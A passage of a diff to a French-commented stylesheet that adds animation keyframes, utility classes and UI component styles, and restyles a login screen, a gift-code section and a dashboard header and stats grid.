+                transform: translateX(-25%) rotate(-5deg);
+            }
+            30% {
+                transform: translateX(20%) rotate(3deg);
+            }
+            45% {
+                transform: translateX(-15%) rotate(-3deg);
+            }
+            60% {
+                transform: translateX(10%) rotate(2deg);
+            }
+            75% {
+                transform: translateX(-5%) rotate(-1deg);
+            }
+            100% {
+                transform: translateX(0%);
+            }
+        }
+
+        @keyframes jello {
+            0%, 100% {
+                transform: scale(1, 1);
+            }
+            30% {
+                transform: scale(1.25, 0.75);
+            }
+            40% {
+                transform: scale(0.75, 1.25);
+            }
+            50% {
+                transform: scale(1.15, 0.85);
+            }
+            65% {
+                transform: scale(0.95, 1.05);
+            }
+            75% {
+                transform: scale(1.05, 0.95);
+            }
+        }
+
+        @keyframes rubberBand {
+            0% {
+                transform: scale(1);
+            }
+            30% {
+                transform: scaleX(1.25) scaleY(0.75);
+            }
+            40% {
+                transform: scaleX(0.75) scaleY(1.25);
+            }
+            60% {
+                transform: scaleX(1.15) scaleY(0.85);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes tada {
+            0% {
+                transform: scale(1);
+            }
+            10%, 20% {
+                transform: scale(0.9) rotate(-3deg);
+            }
+            30%, 50%, 70%, 90% {
+                transform: scale(1.1) rotate(3deg);
+            }
+            40%, 60%, 80% {
+                transform: scale(1.1) rotate(-3deg);
+            }
+            100% {
+                transform: scale(1) rotate(0);
+            }
+        }
+
+        /* Classes d'animation */
+        .animate-fade-in { animation: fadeIn 0.5s var(--transition-base) forwards; }
+        .animate-fade-out { animation: fadeOut 0.5s var(--transition-base) forwards; }
+        .animate-fade-up { animation: fadeInUp 0.6s var(--transition-bounce) forwards; }
+        .animate-fade-down { animation: fadeInDown 0.6s var(--transition-base) forwards; }
+        .animate-fade-left { animation: fadeInLeft 0.6s var(--transition-base) forwards; }
+        .animate-fade-right { animation: fadeInRight 0.6s var(--transition-base) forwards; }
+        .animate-scale { animation: scaleIn 0.5s var(--transition-bounce) forwards; }
+        .animate-rotate { animation: rotateIn 0.6s var(--transition-bounce) forwards; }
+        .animate-pulse { animation: pulse 2s ease-in-out infinite; }
+        .animate-pulse-glow { animation: pulseGlow 3s ease-in-out infinite; }
+        .animate-spin { animation: spin 1s linear infinite; }
+        .animate-ping { animation: ping 1s cubic-bezier(0, 0, 0.2, 1) infinite; }
+        .animate-bounce { animation: bounce 1s ease-in-out infinite; }
+        .animate-bounce-x { animation: bounceX 1s ease-in-out infinite; }
+        .animate-float { animation: float 6s ease-in-out infinite; }
+        .animate-shimmer { animation: shimmer 3s linear infinite; }
+        .animate-gradient { animation: gradient 6s ease infinite; background-size: 200% 200%; }
+        .animate-border-glow { animation: borderGlow 3s ease-in-out infinite; }
+        .animate-text-shine { animation: textShine 3s linear infinite; }
+        .animate-wave { animation: wave 2.5s ease-in-out infinite; transform-origin: 70% 70%; }
+        .animate-blink { animation: blink 2s ease-in-out infinite; }
+        .animate-heartbeat { animation: heartbeat 1.5s ease-in-out infinite; }
+        .animate-flip { animation: flip 1s ease-in-out infinite; }
+        .animate-swing { animation: swing 1s ease-in-out infinite; transform-origin: top center; }
+        .animate-wobble { animation: wobble 1s ease-in-out infinite; }
+        .animate-jello { animation: jello 1s ease-in-out infinite; transform-origin: center; }
+        .animate-rubber-band { animation: rubberBand 1s ease-in-out infinite; }
+        .animate-tada { animation: tada 1s ease-in-out infinite; }
+
+        /* Délais d'animation */
+        .delay-100 { animation-delay: 100ms; }
+        .delay-200 { animation-delay: 200ms; }
+        .delay-300 { animation-delay: 300ms; }
+        .delay-400 { animation-delay: 400ms; }
+        .delay-500 { animation-delay: 500ms; }
+        .delay-700 { animation-delay: 700ms; }
+        .delay-1000 { animation-delay: 1000ms; }
+        .delay-1500 { animation-delay: 1500ms; }
+        .delay-2000 { animation-delay: 2000ms; }
+
+        /* Durées d'animation */
+        .duration-75 { animation-duration: 75ms; }
+        .duration-100 { animation-duration: 100ms; }
+        .duration-150 { animation-duration: 150ms; }
+        .duration-200 { animation-duration: 200ms; }
+        .duration-300 { animation-duration: 300ms; }
+        .duration-500 { animation-duration: 500ms; }
+        .duration-700 { animation-duration: 700ms; }
+        .duration-1000 { animation-duration: 1000ms; }
+        .duration-1500 { animation-duration: 1500ms; }
+        .duration-2000 { animation-duration: 2000ms; }
+        .duration-3000 { animation-duration: 3000ms; }
+
+        /* Fonctions d'animation */
+        .ease-linear { animation-timing-function: linear; }
+        .ease-in { animation-timing-function: cubic-bezier(0.4, 0, 1, 1); }
+        .ease-out { animation-timing-function: cubic-bezier(0, 0, 0.2, 1); }
+        .ease-in-out { animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1); }
+        .ease-bounce { animation-timing-function: cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .ease-elastic { animation-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55); }
+
+        /* ==================== COMPOSANTS UI ULTRA COMPLETS ==================== */
+
+        /* Cards */
+        .card {
+            background: var(--bg-card);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border-medium);
+            border-radius: 32px;
+            padding: clamp(20px, 4vw, 32px);
+            transition: all var(--transition-base);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--primary-600), var(--premium-500), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.6s ease;
+        }
+
+        .card:hover {
+            transform: translateY(-4px);
+            border-color: var(--primary-600);
+            box-shadow: var(--shadow-2xl);
+            background: var(--bg-card-hover);
+        }
+
+        .card:hover::before {
+            transform: translateX(100%);
+        }
+
+        .card-glass {
+            background: rgba(18, 22, 36, 0.7);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .card-premium {
+            background: linear-gradient(135deg, rgba(168, 85, 247, 0.1), rgba(88, 101, 242, 0.1));
+            border: 2px solid var(--premium-500);
+            box-shadow: var(--shadow-glow-premium);
+        }
+
+        .card-premium:hover {
+            border-color: var(--premium-400);
+            box-shadow: 0 0 40px rgba(168, 85, 247, 0.4);
+        }
+
+        .card-interactive {
+            cursor: pointer;
+            transition: all var(--transition-bounce);
+        }
+
+        .card-interactive:hover {
+            transform: scale(1.02) translateY(-4px);
+        }
+
+        .card-interactive:active {
+            transform: scale(0.98);
+        }
+
+        /* Boutons */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            line-height: 1;
+            text-decoration: none;
+            white-space: nowrap;
+            cursor: pointer;
+            border: none;
+            transition: all var(--transition-base);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+
+        .btn:hover::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        .btn:focus-visible {
+            outline: 2px solid var(--primary-500);
+            outline-offset: 2px;
+        }
+
+        .btn-sm {
+            padding: 8px 16px;
+            font-size: 0.875rem;
+            border-radius: 30px;
+        }
+
+        .btn-md {
+            padding: 12px 24px;
+            font-size: 1rem;
+            border-radius: 40px;
+        }
+
+        .btn-lg {
+            padding: 16px 32px;
+            font-size: 1.125rem;
+            border-radius: 50px;
+        }
+
+        .btn-xl {
+            padding: 20px 40px;
+            font-size: 1.25rem;
+            border-radius: 60px;
+        }
+
+        .btn-2xl {
+            padding: 24px 48px;
+            font-size: 1.5rem;
+            border-radius: 70px;
+        }
+
+        .btn-icon {
+            padding: 12px;
+            border-radius: 50%;
+        }
+
+        .btn-icon-sm {
+            padding: 8px;
+            border-radius: 50%;
+        }
+
+        .btn-icon-lg {
+            padding: 16px;
+            border-radius: 50%;
+        }
+
+        .btn-icon-xl {
+            padding: 20px;
+            border-radius: 50%;
+        }
+
+        .btn-block {
+            width: 100%;
+        }
+
+        /* Variantes de boutons */
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-600), var(--primary-700));
+            color: white;
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, var(--primary-500), var(--primary-600));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.5);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, var(--success-500), var(--success-600));
+            color: white;
+            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
+        }
+
+        .btn-success:hover {
+            background: linear-gradient(135deg, var(--success-400), var(--success-500));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(34, 197, 94, 0.5);
+        }
+
+        .btn-error {
+            background: linear-gradient(135deg, var(--error-500), var(--error-600));
+            color: white;
+            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3);
+        }
+
+        .btn-error:hover {
+            background: linear-gradient(135deg, var(--error-400), var(--error-500));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(239, 68, 68, 0.5);
+        }
+
+        .btn-warning {
+            background: linear-gradient(135deg, var(--warning-500), var(--warning-600));
+            color: white;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+        }
+
+        .btn-warning:hover {
+            background: linear-gradient(135deg, var(--warning-400), var(--warning-500));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(245, 158, 11, 0.5);
+        }
+
+        .btn-info {
+            background: linear-gradient(135deg, var(--info-500), var(--info-600));
+            color: white;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+        }
+
+        .btn-info:hover {
+            background: linear-gradient(135deg, var(--info-400), var(--info-500));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(59, 130, 246, 0.5);
+        }
+
+        .btn-premium {
+            background: linear-gradient(135deg, var(--premium-500), var(--premium-600));
+            color: white;
+            box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
+        }
+
+        .btn-premium:hover {
+            background: linear-gradient(135deg, var(--premium-400), var(--premium-500));
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(168, 85, 247, 0.5);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--border-heavy);
+            color: var(--text-primary);
+        }
+
+        .btn-outline:hover {
+            border-color: var(--primary-500);
+            color: var(--primary-500);
+            background: rgba(88, 101, 242, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--text-primary);
+        }
+
+        .btn-ghost:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .btn-link {
+            background: transparent;
+            color: var(--primary-600);
+            text-decoration: underline;
+            text-underline-offset: 4px;
+        }
+
+        .btn-link:hover {
+            color: var(--primary-500);
+            transform: translateY(-2px);
+        }
+
+        .btn-gradient {
+            background: linear-gradient(135deg, var(--primary-600), var(--premium-500), var(--success-500));
+            background-size: 200% 200%;
+            color: white;
+            animation: gradient 6s ease infinite;
+        }
+
+        .btn-gradient:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(88, 101, 242, 0.5);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        /* Inputs */
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 18px;
+            background: var(--bg-input);
+            border: 2px solid var(--border-medium);
+            border-radius: 20px;
+            color: var(--text-primary);
+            font-size: 1rem;
+            transition: all var(--transition-base);
+        }
+
+        .input-field:hover {
+            background: var(--bg-input-hover);
+            border-color: var(--border-heavy);
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary-600);
+            box-shadow: var(--shadow-glow);
+            background: var(--bg-input-hover);
+        }
+
+        .input-field::placeholder {
+            color: var(--text-muted);
+        }
+
+        .input-field:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .input-error {
+            border-color: var(--error-500);
+        }
+
+        .input-error:focus {
+            border-color: var(--error-500);
+            box-shadow: var(--shadow-glow-error);
+        }
+
+        .input-success {
+            border-color: var(--success-500);
+        }
+
+        .input-success:focus {
+            border-color: var(--success-500);
+            box-shadow: var(--shadow-glow-success);
+        }
+
+        .input-warning {
+            border-color: var(--warning-500);
+        }
+
+        .input-warning:focus {
+            border-color: var(--warning-500);
+            box-shadow: var(--shadow-glow-warning);
+        }
+
+        .input-premium {
+            border-color: var(--premium-500);
+        }
+
+        .input-premium:focus {
+            border-color: var(--premium-500);
+            box-shadow: var(--shadow-glow-premium);
+        }
+
+        textarea.input-field {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        select.input-field {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%239fa6c2' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3E%3C/svg%3E");
+            background-position: right 12px center;
+            background-repeat: no-repeat;
+            background-size: 20px;
+            padding-right: 40px;
+        }
+
+        /* Badges */
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            white-space: nowrap;
+        }
+
+        .badge-sm {
+            padding: 2px 8px;
+            font-size: 0.625rem;
+        }
+
+        .badge-md {
+            padding: 4px 12px;
+            font-size: 0.75rem;
+        }
+
+        .badge-lg {
+            padding: 6px 16px;
+            font-size: 0.875rem;
+        }
+
+        .badge-xl {
+            padding: 8px 20px;
+            font-size: 1rem;
+        }
+
+        .badge-primary {
+            background: var(--primary-600);
+            color: white;
+        }
+
+        .badge-success {
+            background: var(--success-500);
+            color: white;
+        }
+
+        .badge-error {
+            background: var(--error-500);
+            color: white;
+        }
+
+        .badge-warning {
+            background: var(--warning-500);
+            color: white;
+        }
+
+        .badge-info {
+            background: var(--info-500);
+            color: white;
+        }
+
+        .badge-premium {
+            background: linear-gradient(135deg, var(--premium-500), var(--premium-600));
+            color: white;
+        }
+
+        .badge-outline {
+            background: transparent;
+            border: 1px solid currentColor;
+        }
+
+        .badge-outline-primary {
+            background: transparent;
+            border: 1px solid var(--primary-600);
+            color: var(--primary-600);
+        }
+
+        .badge-outline-success {
+            background: transparent;
+            border: 1px solid var(--success-500);
+            color: var(--success-500);
+        }
+
+        .badge-outline-error {
+            background: transparent;
+            border: 1px solid var(--error-500);
+            color: var(--error-500);
+        }
+
+        .badge-outline-warning {
+            background: transparent;
+            border: 1px solid var(--warning-500);
+            color: var(--warning-500);
+        }
+
+        .badge-outline-premium {
+            background: transparent;
+            border: 1px solid var(--premium-500);
+            color: var(--premium-500);
+        }
+
+        /* Alertes */
+        .alert {
+            padding: 16px 20px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            animation: fadeInUp 0.5s;
+        }
+
+        .alert-sm {
+            padding: 12px 16px;
+            font-size: 0.875rem;
+        }
+
+        .alert-lg {
+            padding: 20px 24px;
+            font-size: 1.125rem;
+        }
+
+        .alert-success {
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid var(--success-500);
+            color: var(--success-500);
+        }
+
+        .alert-error {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--error-500);
+            color: var(--error-500);
+        }
+
+        .alert-warning {
+            background: rgba(245, 158, 11, 0.1);
+            border: 1px solid var(--warning-500);
+            color: var(--warning-500);
+        }
+
+        .alert-info {
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid var(--info-500);
+            color: var(--info-500);
+        }
+
+        .alert-premium {
+            background: rgba(168, 85, 247, 0.1);
+            border: 1px solid var(--premium-500);
+            color: var(--premium-500);
+        }
+
+        .alert-icon {
+            font-size: 1.25rem;
+        }
+
+        .alert-content {
+            flex: 1;
+        }
+
+        .alert-title {
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .alert-message {
+            font-size: 0.875rem;
+            opacity: 0.9;
+        }
+
+        .alert-close {
+            background: transparent;
+            border: none;
+            color: currentColor;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity var(--transition-fast);
+        }
+
+        .alert-close:hover {
+            opacity: 1;
+        }
+
+        /* Progress bars */
+        .progress {
+            width: 100%;
+            height: 8px;
+            background: var(--bg-tertiary);
+            border-radius: 9999px;
+            overflow: hidden;
+        }
+
+        .progress-sm {
+            height: 4px;
+        }
+
+        .progress-md {
+            height: 8px;
+        }
+
+        .progress-lg {
+            height: 12px;
+        }
+
+        .progress-xl {
+            height: 16px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary-600), var(--premium-500));
+            border-radius: 9999px;
+            transition: width 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        .progress-bar-success {
+            background: linear-gradient(90deg, var(--success-500), var(--success-400));
+        }
+
+        .progress-bar-error {
+            background: linear-gradient(90deg, var(--error-500), var(--error-400));
+        }
+
+        .progress-bar-warning {
+            background: linear-gradient(90deg, var(--warning-500), var(--warning-400));
+        }
+
+        .progress-bar-premium {
+            background: linear-gradient(90deg, var(--premium-500), var(--premium-400));
+        }
+
+        /* Loader */
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 4px solid var(--border-heavy);
+            border-top-color: var(--primary-600);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loader-sm {
+            width: 24px;
+            height: 24px;
+            border-width: 3px;
+        }
+
+        .loader-md {
+            width: 48px;
+            height: 48px;
+            border-width: 4px;
+        }
+
+        .loader-lg {
+            width: 64px;
+            height: 64px;
+            border-width: 5px;
+        }
+
+        .loader-xl {
+            width: 96px;
+            height: 96px;
+            border-width: 6px;
+        }
+
+        .loader-primary {
+            border-top-color: var(--primary-600);
+        }
+
+        .loader-success {
+            border-top-color: var(--success-500);
+        }
+
+        .loader-error {
+            border-top-color: var(--error-500);
+        }
+
+        .loader-warning {
+            border-top-color: var(--warning-500);
+        }
+
+        .loader-premium {
+            border-top-color: var(--premium-500);
+        }
+
+        /* Tooltips */
+        .tooltip {
+            position: relative;
+        }
+
+        .tooltip:hover::after {
+            content: attr(data-tooltip);
+            position: absolute;
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 8px 12px;
+            background: var(--bg-tertiary);
+            color: var(--text-primary);
+            font-size: 0.75rem;
+            border-radius: 8px;
+            white-space: nowrap;
+            z-index: var(--z-tooltip);
+            border: 1px solid var(--border-medium);
+            box-shadow: var(--shadow-lg);
+            margin-bottom: 8px;
+        }
+
+        .tooltip-left:hover::after {
+            left: auto;
+            right: 100%;
+            bottom: 50%;
+            transform: translateY(50%);
+            margin-right: 8px;
+            margin-bottom: 0;
+        }
+
+        .tooltip-right:hover::after {
+            left: 100%;
+            bottom: 50%;
+            transform: translateY(50%);
+            margin-left: 8px;
+            margin-bottom: 0;
+        }
+
+        .tooltip-top:hover::after {
+            bottom: 100%;
+            left: 50%;
+            transform: translateX(-50%);
+            margin-bottom: 8px;
+        }
+
+        .tooltip-bottom:hover::after {
+            top: 100%;
+            bottom: auto;
+            left: 50%;
+            transform: translateX(-50%);
+            margin-top: 8px;
         }
 
         /* ==================== LOGIN SCREEN ==================== */
@@ -45,449 +1843,1232 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            padding: 20px;
+            position: relative;
         }
 
         .login-card {
+            width: 100%;
+            max-width: 550px;
             background: var(--bg-card);
             backdrop-filter: blur(20px);
-            width: 550px;
-            padding: 50px;
-            border-radius: 50px;
-            border: 1px solid var(--border);
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
-        }
-
-        .login-header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-
-        .login-header h1 {
-            font-size: 36px;
-            background: linear-gradient(135deg, #fff, var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-        }
-
-        /* ==================== CODE CADEAU ==================== */
-        .code-section {
-            background: linear-gradient(135deg, var(--premium), var(--accent));
-            padding: 25px;
-            border-radius: 30px;
-            margin-bottom: 30px;
+            border: 1px solid var(--border-medium);
+            border-radius: 60px;
+            padding: 50px 40px;
+            box-shadow: var(--shadow-2xl);
+            animation: fadeInUp 0.8s var(--transition-bounce);
             position: relative;
             overflow: hidden;
+            z-index: 1;
         }
 
-        .code-section::before {
+        .login-card::before {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
-            animation: rotate 10s linear infinite;
+            background: radial-gradient(circle, rgba(88, 101, 242, 0.1) 0%, transparent 70%);
+            animation: rotate 30s linear infinite;
         }
 
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
+        .login-header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 25px;
+            background: linear-gradient(135deg, var(--primary-600), var(--premium-500));
+            border-radius: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            color: white;
+            animation: float 6s ease-in-out infinite;
+            box-shadow: var(--shadow-glow);
+        }
+
+        .login-title {
+            font-size: clamp(32px, 5vw, 42px);
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, var(--primary-600));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+            font-family: 'Clash Display', sans-serif;
+        }
+
+        .login-subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+
+        /* ==================== CODE SECTION ==================== */
+        .code-section {
+            background: linear-gradient(135deg, rgba(168, 85, 247, 0.2), rgba(88, 101, 242, 0.2));
+            border-radius: 40px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 2px solid var(--premium-500);
+            position: relative;
+            z-index: 1;
+            animation: borderGlow 3s ease-in-out infinite;
         }
 
         .code-title {
             font-size: 20px;
             font-weight: 700;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             display: flex;
             align-items: center;
-            gap: 10px;
-        }
-
-        .code-input {
-            display: flex;
-            gap: 10px;
-            position: relative;
-            z-index: 2;
-        }
-
-        .code-input input {
-            flex: 1;
-            padding: 15px;
-            background: rgba(0,0,0,0.3);
-            border: 2px solid rgba(255,255,255,0.2);
-            border-radius: 20px;
+            justify-content: center;
+            gap: 15px;
             color: white;
-            font-size: 16px;
+        }
+
+        .code-title span:first-child,
+        .code-title span:last-child {
+            font-size: 28px;
+            animation: bounce 2s ease-in-out infinite;
+        }
+
+        .code-input-group {
+            display: flex;
+            gap: 15px;
+        }
+
+        .code-input-group input {
+            flex: 1;
+            padding: 16px 20px;
+            background: rgba(0, 0, 0, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px;
+            color: white;
+            font-size: 18px;
             text-transform: uppercase;
+            letter-spacing: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            transition: all var(--transition-base);
         }
 
-        .code-input input:focus {
+        .code-input-group input:focus {
             outline: none;
-            border-color: white;
+            border-color: var(--premium-500);
+            box-shadow: 0 0 40px rgba(168, 85, 247, 0.4);
         }
 
-        .code-input button {
-            padding: 15px 30px;
-            background: white;
-            color: var(--accent);
-            border: none;
-            border-radius: 20px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
+        .code-input-group input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: normal;
         }
 
-        .code-input button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 10px 30px rgba(255,255,255,0.3);
-        }
-
-        .input-group {
-            margin-bottom: 25px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 8px;
-            color: var(--text-secondary);
-            font-size: 14px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 16px;
-            background: var(--bg-secondary);
-            border: 2px solid var(--border);
-            border-radius: 20px;
-            color: var(--text);
-            font-size: 15px;
-        }
-
-        .input-group input:focus {
-            outline: none;
-            border-color: var(--accent);
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, var(--accent), #3744b0);
+        .code-input-group button {
+            padding: 16px 35px;
+            background: linear-gradient(135deg, var(--premium-500), var(--premium-600));
             color: white;
             border: none;
             border-radius: 30px;
-            font-size: 18px;
             font-weight: 700;
+            font-size: 16px;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all var(--transition-base);
+            white-space: nowrap;
+            box-shadow: var(--shadow-glow-premium);
         }
 
-        .login-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(88, 101, 242, 0.4);
-        }
-
-        .hidden {
-            display: none !important;
+        .code-input-group button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 15px 40px rgba(168, 85, 247, 0.5);
         }
 
         /* ==================== DASHBOARD ==================== */
         .dashboard {
             background: var(--bg-card);
             backdrop-filter: blur(20px);
-            border-radius: 50px;
-            padding: 40px;
-            border: 1px solid var(--border);
+            border: 1px solid var(--border-medium);
+            border-radius: 70px;
+            padding: clamp(30px, 5vw, 50px);
+            animation: fadeInUp 0.6s var(--transition-bounce);
         }
 
-        .header {
+        /* Header */
+        .dashboard-header {
             display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 40px;
+            margin-bottom: 50px;
             padding-bottom: 30px;
-            border-bottom: 2px solid var(--border);
+            border-bottom: 2px solid var(--border-medium);
         }
 
-        .user-info {
+        .user-profile {
             display: flex;
             align-items: center;
             gap: 25px;
         }
 
-        .avatar {
-            width: 80px;
-            height: 80px;
+        .user-avatar {
+            width: 100px;
+            height: 100px;
             border-radius: 50%;
-            border: 4px solid var(--accent);
+            border: 4px solid var(--primary-600);
+            position: relative;
+            animation: pulseGlow 3s infinite;
         }
 
-        .user-details h2 {
-            font-size: 28px;
+        .user-avatar img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .user-status {
+            position: absolute;
+            bottom: 5px;
+            right: 5px;
+            width: 18px;
+            height: 18px;
+            background: var(--success-500);
+            border-radius: 50%;
+            border: 3px solid var(--bg-card);
+            animation: ping 2s infinite;
+        }
+
+        .user-info h2 {
+            font-size: clamp(24px, 4vw, 32px);
+            font-weight: 800;
             margin-bottom: 8px;
+            background: linear-gradient(135deg, #fff, var(--primary-600));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
-
-        .role-badge {
-            padding: 6px 18px;
-            border-radius: 40px;
-            font-size: 13px;
-            font-weight: 700;
-        }
-
-        .role-admin { background: var(--danger); }
-        .role-premium { background: var(--premium); color: black; }
-        .role-user { background: var(--bg-tertiary); }
 
         .header-actions {
             display: flex;
             gap: 15px;
+            flex-wrap: wrap;
         }
 
-        .admin-btn {
-            background: var(--danger);
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 40px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        .logout-btn {
-            background: var(--bg-tertiary);
-            color: var(--text);
-            border: 1px solid var(--border);
-            padding: 12px 25px;
-            border-radius: 40px;
-            cursor: pointer;
-        }
-
-        /* ==================== STATS ==================== */
+        /* Stats Cards */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 20px;
-            margin-bottom: 40px;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
         }
 
         .stat-card {
             background: var(--bg-secondary);
-            padding: 25px;
-            border-radius: 30px;
-            border: 1px solid var(--border);
+            border: 1px solid var(--border-medium);
+            border-radius: 40px;
+            padding: 30px 25px;
+            text-align: center;
+            transition: all var(--transition-base);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary-600), var(--premium-500));
+        }
+
+        .stat-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--primary-600);
+            box-shadow: var(--shadow-2xl);
+        }
+
+        .stat-icon {
+            font-size: 40px;
+            margin-bottom: 15px;
         }
 
         .stat-value {
-            font-size: 36px;
+            font-size: clamp(32px, 5vw, 42px);
             font-weight: 800;
-            margin: 10px 0 5px;
-            color: var(--accent);
+            margin-bottom: 5px;
+            background: linear-gradient(135deg, #fff, var(--primary-600));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
         .stat-label {
             color: var(--text-secondary);
-            font-size: 13px;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        /* ==================== MODES DM ==================== */
